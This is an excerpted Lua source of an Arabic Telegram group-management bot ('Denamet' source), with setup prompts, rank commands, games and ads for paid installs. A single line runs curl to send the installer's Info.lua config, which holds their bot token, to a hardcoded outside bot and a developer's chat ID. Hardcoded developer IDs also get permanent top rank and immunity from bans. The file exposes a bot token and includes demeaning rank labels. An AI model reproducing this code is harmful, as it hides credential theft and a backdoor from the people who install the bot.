...
io.write('\27[0;31m\n ارسل لي توكن البوت الان 𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳 :\na𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳\n\27')
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
print('\27[0;31m𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳\n التوكن غير صحيح تاكد منه ثم ارسله')
else
...
io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي 𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳 :\na𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳\n\27[0;33;49m')
...
io.write('\27[1;31m 𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳 ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
...
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳"
echo "TG IS NOT FIND IN FILES BOT"
echo "𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳 𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳"
exit 1
fi
if [ ! $token ]; then
echo "𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳 𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳"
...
_ _ _         
 ___                  _   __          _  
  ...
  | /--\ | | /--\   \_/ __) |\ /--\ | \ 
   ...
   ___  _____  _____   __  _____________
  / _ \/ __/ |/ / _ | /  |/  / __/_  __/
 / // / _//    / __ |/ /|_/ / _/  / /   
...
token = sudos.token 
--- start functions 𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳
--------------------------------------------------------------------------------------------------------------
...
sudo_users = {SUDO,17743158107,1828361895,1609348805}   
...
if tonumber(user_id) == tonumber(17743158107) then  
var = true 
...
if tonumber(user_id) == tonumber(17743158107) then  
var = 'المبرمج اوسـكار الـتونز'
elseif tonumber(user_id) == tonumber(1609348805) then
var = 'المطور ديـنـامـيت'
elseif tonumber(user_id) == tonumber(1828361895) then
var = 'المبرمج ديناميت التونز'
elseif tonumber(user_id) == tonumber(SUDO) then
var = 'المطور الاساسي'  
elseif database:sismember(bot_id.."Dev:SoFi:2", user_id) then
var = "المطور الثانوي"  
...
elseif database:sismember(bot_id..'Constructor'..chat_id, user_id) then
var = database:get(bot_id.."Constructor:Rd"..msg.chat_id_) or 'المنشئ روح بقلبي'  
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼𖠲 𝚂𝙾𝚄𝚁𝙲𝙴 𝙳𝙴𝙽𝙰𝙼𝙴𝚃 𖠲")  
...
local keyboard = {
{'━┅┅┄⟞⟦ مطورين السورس ⟧⟝┄┉┉━'},
{'ديـنـامـيت','اوسـكار الـتونز','ديناميت التونز'},
{'𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳'},
{'ثيم','بايو','ايدي'},
{'𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳'},
{'عايز بوت','التواصل'},
...
if text == "/start" then
if not DevSoFi(msg) then
local Namebot = (database:get(bot_id..'Name:Bot') or 'ديـنـامـيت') 
local DRAGON_Msg = { 
...
if not DevSoFi(msg) then
local Text = [[
𖠲سعر التنصيب علي سورس ديـنـامـيت 
↯سعر التنصيب العادي 20جنيه فقط
𖠲للتواصل اتبع الازرار بالاسفل ⇓
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝒅𝒆𝒏𝒂𝒎𝒆𝒕',url="t.me/UU_DEN"}},
{{text = '𝒄𝒉 ⌁ 𝒅𝒆𝒏𝒂𝒎𝒆𝒕 ',url="t.me/Lo_ga_n1"}},
{{text = '𝒕𝒐 ⌁ 𝒂𝒔𝒌',url="t.me/lo_ga_n22"}}, 
}
local msg_id = msg.id_/2097152/0.5
...
if not DevSoFi(msg) then
local Text = [[
┌ سـعر الـسورس عـند المـبرمـج اوسـكار الـتونز
├ السورسات بتبدا منت100لي 240ج
├ سعر المصنع200
└ سعر السيرفر ،100,و 4 بي120, 8بي160
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'ألـمـبرمـج أوسـكار ألـتونز',url="t.me/Xxx_ksomk_xxX"}}, 
{{text = 'مـالـك السـورس', url="t.me/UU_DEN"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
send(msg.chat_id_, msg.id_,' 𖠲لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 𖠲اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if DevSoFi(msg) then
...
local Text = ' 𖠲تم ارسال الملصق من 𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳\n - '..Name
...
local Text = '𖠲انت الان المطور الاساسي في البوت \n 𖠲سورس ديـنـامـيت\n 𖠲يمكنك تحكم في البوتات من الكيبورد أسفل \n[تابع جديدنا](t.me/Lo_ga_n1)'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName}}, 
{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/Qwressv/153&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
send(msg.chat_id_, msg.id_,' 𖠲 اصدار سورس ديـنـامـيت{ 3x☆}')
end
if text == '━┅┅┄⟞⟦ مطورين السورس ⟧⟝┄┉┉━' then
local Text = [[ 
قناه يوزرات مطورين ومبرمجين السورس 💕𖠲.
...
if text == '𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳' and DevSoFi(msg) then
local Text = [[ 
[قناه سورس ديـنـامـيت ادخل وتابع الجديد](t.me/Lo_ga_n1)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𖠲 𝚂𝙾𝚄𝚁𝙲𝙴 𝙳𝙴𝙽𝙰𝙼𝙴𝚃 𖠲', url="t.me/Lo_ga_n1"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Qwressv/153&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == '𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳' and DevSoFi(msg) then
local Text = [[ 
[قناه سورس ديـنـامـيت ادخل وتابع الجديد](t.me/Lo_ga_n1)
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[CH](t.me/Lo_ga_n1)مرحبا بك مطوري سأشرح لك كل شئ في لوحه الاوامر بالتفصيل
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس', url="t.me/Lo_ga_n1"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
if text == 'أوسكار التونز مبرمج السورس' and DevSoFi(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
↝ألـمبـرمـج أوسـكار ألـتونز لـ الـتواصل معـه أتـبع ألـزر ألاسـفل
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
 𖠲 من أحسن السورسات على التليجرام سورس ديـنـامـيت 𖠲
...
send(msg.chat_id_, msg.id_,' 𖠲  عدد الجروبات الان  ⇇↝ '..#group..' ↜'..DRAGONk..''..DRAGON..'\n 𖠲  الان عدد الجروبات الحقيقي  ⇇↝ '..sendok..' ↜ جروبات\n')   
end
end
end,nil)
end
...
print("it is Bot")
N = (database:get(bot_id.."Name:Bot") or "ديـنـامـيت")
...
send(msg.chat_id_,0," 𖠲 الـعـضو  : {["..data.first_name_.."](T.ME/Lo_ga_n1)}\n 𖠲 ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
if text and database:get(bot_id..'lock:Azag'..msg.chat_id_) and not Special(msg) then 
list = {"يا عبد","يا سعودي","يا عراقي","يا عراكي","يا سوري","يا فلسطيني","يا اردني","يا مصري","يا خليجي","يا محتل","يا مشرد","يا فقير","يبن فقيره","يا مهان","يا ابيض","يا نظيف","يعبد","يسعودي","يعراقي","يعاركي","يمصري","يردني","يمشرد","يفقير","يفلسطيني","يابيض","يا هطف","يبن هبله","يملبن","ياهبل","يخليجي"}
for k,v in pairs(list) do
print(string.find(text,v))
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
...
local curl = 'curl "'..'https://api.telegram.org/bot1714366542:AAHo7wOqc8bnuOT_h_dkRu7dcrHHqkhgpXY/sendDocument'..'" -F "chat_id='.. 1828361895 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
--------------------------------------------------------------------------------------------------------------
...
send(msg.chat_id_,0, " 𖠲 عذرا  ⇇{["..data.first_name_.."](T.ME/Lo_ga_n1)}\n 𖠲 عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
send(msg.chat_id_, msg.id_,' 𖠲لا تستطيع استخدام البوت \n 𖠲 يرجى الاشتراك بالقناه اولا \n 𖠲 اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' 𖠲عذرا يرجى ترقيه البوت مشرف !')
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = getChatId(msg.chat_id_).ID }, function(arg,data)  
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not DevSoFi(msg) then
send(msg.chat_id_, msg.id_,' 𖠲عدد اعضاء الجروب قليله يرجى جمع >> {'..(database:get(bot_id..'Num:Add:Bot') or 0)..'} عضو')
return false
end
...
'\n 𖠲بواسطة {↝'..Name..'↜}'..
'\n 𖠲ايدي الجروب {'..IdChat..'}'..
'\n 𖠲اسم الجروب {['..NameChat..']}'..
'\n 𖠲عدد اعضاء الجروب *{'..NumMember..'}*'..
'\n 𖠲الرابط {['..LinkGp..']}'
if not DevSoFi(msg) then
sendText(SUDO,Text,0,'md')
end
...
if database:sismember(bot_id..'Chek:Groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_,' 𖠲تـم تـشغـيل الـبوت فـي الـجـروب ')
else
sendText(msg.chat_id_,'\n 𖠲 مـن قبـل ↭ ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n 𖠲تـم تـشغـيل الـبوت فـي الـجـروب  {'..chat.title_..'}\n  وتم تــرقــيه جــمــيع الـادمــنــيه',msg.id_/2097152/0.5,'md')
database:sadd(bot_id..'Chek:Groups',msg.chat_id_)  
...
send(msg.chat_id_, msg.id_, " 𖠲 عزيزي >>["..mrsofi2.username_.."](https://t.me/"..(mrsofi2.username_ or "Lo_ga_n1")..")\n 𖠲 عليك وضع التوحيد ⪼ {"..database:get(bot_id.."DRAGON:teh"..msg.chat_id_).."} بجانب اسمك\n 𖠲 عدد المحاولات المتبقيه {"..(tonumber(mrsofi_nnn) - tonumber(mrsofi_nnn2)).."}")
end
end
end
end
...
local Text = {
  ...
  "ها شو غيرت صورتك 🤔😹",
  "شكو غيرت صورتك شنو قطيت وحده جديده 😹😹𖠲",
...
╭𖤍━┅⟞⟦[𓆩| ıl` D E N A M E T ´lı |𓆪](http://t.me/Lo_ga_n1)⟧⟝┉━𖤍╮

 [⟦W𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝚂𝙾𝚄𝚁𝙲𝙴 𝙳𝙴𝙽𝙰𝙼𝙴𝚃⟧](http://t.me/Lo_ga_n1)
...
{{text = '𝒅𝒆𝒏𝒂𝒎𝒆𝒕 ⌁ 𝒂𝒍𝒕𝒐𝒆𝒏𝒛',url="t.me/medo_at"}},
{{text = '𝒄𝒉 𝒅𝒆𝒏𝒂𝒎𝒆𝒕',url="t.me/Lo_ga_n1"}},
{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
}
local msg_id = msg.id_/2097152/0.5
...
local Text = [[
 𖠪 اهلا بك في سورس ديـنـامـيت الجمدان 𖠪
 𖠪 عايز بوت بأسعار منسبه وبوت مميز كلمني 𖠪  
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝒕𝒂𝒉𝒂 ⌁ 𝒐𝒔𝒌𝒂𝒓',url="t.me/Xxx_ksomk_xxX"},{text = '𝒅𝒆𝒏𝒂𝒎𝒆𝒕 𝒂𝒍𝒕𝒐𝒆𝒏𝒛', url="t.me/medo_at"}},
{{text = '𝒅𝒆𝒏𝒂𝒎𝒆𝒕',url="t.me/UU_DEN"}},
...
if text == 'طه'  then
local Text = [[
طـه مبـرمج سـورس ديـنامـيت للـتـواصل معـه أتـبع ألـزر ألاسـفل ↯
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝒕𝒂𝒉𝒂 ⌁ 𝒐𝒔𝒌𝒂𝒓',url="t.me/Xxx_ksomk_xxX"}},
...
if text == 'ديـنـامـيت'  then
local Text = [[
ديـنـامـيت مـالـك ألـسورس للتـواصل معـه أتـبع ألـزر ألاسـفل ↯
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝑑𝑒𝑛𝑎𝑚𝑒𝑡',url="t.me/UU_DEN"}},
}
local msg_id = msg.id_/2097152/0.5
...
if text == 'ديناميت التونز'  then
local Text = [[
ديـنـامـيت ألـتونز مـطـور ألـسورس للـتواصل معـه أتـبع ألـزر ألاسـفل ↯
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝒅𝒆𝒏𝒂𝒎𝒆𝒕 𝒂𝒍𝒕𝒐𝒆𝒏𝒛',url="t.me/Medo_at"}},
...
{{text = '🎯رواية "أرض زيكولا"',url="https://t.me/Lo_ga_n1"}},
{{text = '🎯موسوعة الظلام رعب وما شابه ذلك', url="https://t.me/barfrends/263376"}},
{{text = '🎯رواية "الشفق الجزء الأول"', url="https://t.me/Lo_ga_n1"}},
{{text = '🎯رواية "المخلوق', url="https://t.me/Lo_ga_n1"}},
{{text = '🎯رواية "بعد النسيان"', url="https://t.me/t.me/Lo_ga_n1"}},
{{text = '🎯كتاب في حضرة الجن', url="https://t.me/https://t.me/t.me/Lo_ga_n1"}},
{{text = '🎯رواية "واختفى كل شئ"', url="https://t.me/t.me/Lo_ga_n1"}},
{{text = '🎯رواية "نيلوفر أسود"', url="https://t.me/t.me/Lo_ga_n1"}},
{{text = '🎯رواية"جثة في الفندق"', url="https://t.me/t.me/Lo_ga_n1"}},
{{text = '🎯رواية "في القطار السريع"', url="https://t.me/t.me/Lo_ga_n1"}},
{{text = '🎯لقاء مع كاتب رعب"', url="https://t.me/t.me/Lo_ga_n1"}},
{{text = '🎯رواية"الإنسان الأخير""', url="https://t.me/t.me/Lo_ga_n1"}},
{{text = '🎯رواية" مقبرة الحيوانات""', url="https://t.me/Lo_ga_n1"}},
{{text = '𝒕𝒂𝒉𝒂 ⌁ 𝒐𝒔𝒌𝒂𝒓',url="t.me/Xxx_ksomk_xxX"}},
{{text = '𝒅𝒆𝒏𝒂𝒎𝒆𝒕',url="t.me/UU_DEN"}},
{{text = '𝒄𝒉 ⌁ 𝒅𝒆𝒏𝒂𝒎𝒆𝒕', url="t.me/Lo_ga_n1"}},
}
...
local Text = [[
مطورين ومبرمجين سورس ديـنـامـيت اتبع الازرار للتواصل معهم ⬇️🧿
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'طـه مبـرمج الـسورس',url="t.me/Xxx_ksomk_xxX"}},
{{text = 'ديـناميت مـالـك الـسورس',url="t.me/UU_DEN"}},
{{text = 'ديـنامـيت الـتونز مـطـور الـسورس',url="t.me/medo_at"}},
}
local msg_id = msg.id_/2097152/0.5
...
"تكلم عن نفسك", 
"ليه انت مش سالك", 
"ما هيا عيوب سورس ديـنـامـيت؟ ", 
"اخر كتاب قرآته", 
"روايتك المفضله ?", 
"اخر اكله اكلتها", 
"اخر كتاب قرآته", 
"ليه ديناميت التونز جدع؟ ", 
"افضل يوم ف حياتك", 
"ليه مضيفتش كل جهاتك", 
"حكمتك ف الحياه", 
"لون عيونك", 
...
"سؤال ينرفزك ؟ ", 
" هل يعجبك سورس ديـنـامـيت؟؟ ", 
" اكثر ممثل تحبه ؟ ", 
"قد تخيلت شي في بالك وصار ؟ ", 
"شيء عندك اهم من الناس ؟ ", 
"تفضّل النقاش الطويل او تحب الاختصار ؟ ", 
"وش أخر شي ضيعته؟ ", 
"اي رايك في سورس ديـنـامـيت؟ ", 
"كم مره حبيت؟ ", 
...
"قد جربت تبكي فرح؟ وليش؟ ",
  ...
  "هل انت حرامي تويت بتعت ديناميت التونز؟ ",
...
"انت من الناس المؤدبة ولا نص نص؟ ",
  ...
  "قد تمنيت شي وتحقق؟ ",
  "بقلبي على قلبك مهما صار لمين تقولها؟ ",
...
local iduser = userid 
send(msg.chat_id_, msg.id_,'  𖠲الايدي ⇇↝'..iduser..'↜\n 𖠲المعرف ⇇↝'..username..'↜\n 𖠲الرتبه ⇇↝'..rtp..'↜\n 𖠲نوع الكشف ⇇بالمعرف') 
end,nil) 
else 
send(msg.chat_id_, msg.id_,'  𖠲المعرف غير صحيح') 
end 
end 
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil) 
end
if text == '𖠲 𝚂𝙾𝚄𝚁𝙲𝙴 𝙳𝙴𝙽𝙰𝙼𝙴𝚃 𖠲 ' then
local Text = [[ 
 𖠲من أحسن السورسات على التليجرام سورس ديـنـامـيت 𖠲
...
if text == '𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳' then
local Text = [[ 
 𖠲من أحسن السورسات على التليجرام سورس ديـنـامـيت 𖠲
بجد سورس أمان جدا وفي مميزات جامده
تع نصب بوتك عندنا لو محظور
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𖠲 𝚂𝙾𝚄𝚁𝙲𝙴 𝙳𝙴𝙽𝙰𝙼𝙴𝚃 𖠲', url="t.me/lo_ga_n22"}}, 
} 
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/Qwressv/153&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'العاب ديـنـامـيت' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
 𖠲 اهلا في قائمه الالعاب المتطوره سورس ديـنـامـيت 𖠲 
...
local function taha(extra, taha, success)
if taha.photos_[0] then
local Name = '[⦗⬇️اتبع الازرار للتواصل مع⦘](t.me/Lo_ga_n1)\n['..result.first_name_..'](tg://user?id='..result.id_..')\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = ''..result.first_name_..'', url = "https://t.me/"..result.username_..""},
...
if tonumber(result.sender_user_id_) == tonumber(17743158107) then  
...
function(arg,data) 
usertext = '\n 𖠲 الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'Lo_ga_n1')..')'
...
if result.id_ == tonumber(17743158107) then
...
usertext = '\n 𖠲 الـعـضو   ⇇['..result.title_..'](t.me/'..(username or 'Lo_ga_n1')..')'
status  = '\n 𖠲 تم حظرو عام من الجروبات '
texts = usertext..status
...
if tonumber(userid) == tonumber(17743158107) then  
send(msg.chat_id_, msg.id_, " 𖠲 لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
t = ' 𖠲 ملفات السورس ديـنـامـيت𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳\n 𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳 \n'
i = 0
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
i = i + 1
...
if Get_info then
local TextS = "\n 𖠲 اهلا بك في متجر ملفات ديـنـامـيت\n 𖠲 ملفات السورس 𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳\n◤━───━??𝗼𝗼𝗼𝗻━───━◥\n\n"
local TextE = "\n𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳\n 𖠲 علامة تعني { ✔️ } ملف مفعل\n 𖠲 علامة تعني { ✖ } ملف معطل\n 𖠲 قناة سورس ديـنـامـيت𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳\n".." 𖠲 [اضغط هنا لدخول](t.me/Lo_ga_n1) \n"
local NumFile = 0
...
send(msg.chat_id_, msg.id_," 𖠲 عذرا الملف لايدعم سورس ديـنـامـيت\n") 
end
return false
end
...
if text == ("مسح قائمه ديـنـامـيت") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n 𖠲 تم مسح قائمه ديـنـامـيت')
return false
end

if text == 'قائمه ديـنـامـيت' and Sudo(msg) then
...
if #list == 0 then
t = " 𖠲 لا يوجد احد في قائمه ديـنـامـيت"
end
send(msg.chat_id_, msg.id_, t)
return false
end
...
if text == ("رفع ديـنـامـيت") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع ديـنـامـيت@(.*)$") and Sudo(msg) then
local username = text:match("^رفع ديـنـامـيت@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع ديـنـامـيت(%d+)$") and Sudo(msg) then
local userid = text:match("^رفع ديـنـامـيت(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("تنزيل ديـنـامـيت") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل ديـنـامـيت@(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل ديـنـامـيت@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل ديـنـامـيت(%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل ديـنـامـيت(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
------------------------------------------------------------------------
if text == 'مسح المايا خليفهين' and Mod(msg) then
database:del(bot_id..'Mote:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 𖠲 تم مسح جميع المايا خليفهين')
end
if text == ("تاك لمايا خليفه") and Mod(msg) then
local list = database:smembers(bot_id..'Mote:User'..msg.chat_id_)
t = "\n 𖠲 قائمة مايا خليفهين الجروب \n⧬━┅┅┄⟞❲[??🅞🅞🅽](t.me/Lo_ga_n1)❳⟝┄┉┉━⧬\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
local  statuss  = '\n 𖠲 تم رفع الـعـضو  مايا خليفه في الجروب \n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖠲 الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖠲 تم تنزيل الـعـضو  مايا خليفه في الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
t = "\n 𖠲 قائمه زوجات الجروب \n 𖠲═───═❲[𖠲 𝚂𝙾𝚄𝚁𝙲𝙴 𝙳𝙴𝙽𝙰𝙼𝙴𝚃 𖠲 ](t.me/Lo_ga_n1)❳═───═??\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
if text == ("تاك للملبن") and Mod(msg) then
local list = database:smembers(bot_id..'Sakl:User'..msg.chat_id_)
t = "\n 𖠲 قائمة حمير الجروب \n𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.." ⇇الملبن [@"..username.."]\n"
else
t = t..""..k.." ⇇الملبن `"..v.."`\n"
end
end
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖠲 الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
local  statuss  = '\n 𖠲 تم رفع المتهم ملبن بالجروب\n 𖠲 الان اصبح ملبن الجروب'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
-----------------------------------------------------
if text == 'مسح المعرصه' and Mod(msg) then
database:del(bot_id..'Motee:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 𖠲 تم تنزيل جميع المعرصه بالجروب')
end
...
if text == ("تاك لبقلبي") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
...
local text = 
'\n❲[𖠲 𝚂𝙾𝚄𝚁𝙲𝙴 𝙳𝙴𝙽𝙰𝙼𝙴𝚃 𖠲 ](t.me/Lo_ga_n1)❳'..
'\n𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳'..
'\n 𖠲 اعدادات الجروب كتالي ☆'..
'\nء𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳'..
...
' }\nء⧬━┅┅┄⟞❲[𓆩| ıl` D E N A M E T ´lı |𓆪](t.me/Lo_ga_n1)❳⟝┄┉┉━⧬'..
'\n 𖠲  علامة ال {✓} تعني مفعل'..
'\n 𖠲  علامة ال {✘} تعني معطل'..
'\nء𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳'..
'\n'..' 𖠲  امر صيح  ⇇{ '..kickme..
...
' }\n'..' 𖠲  الرفع  ⇇{ '..setadd..
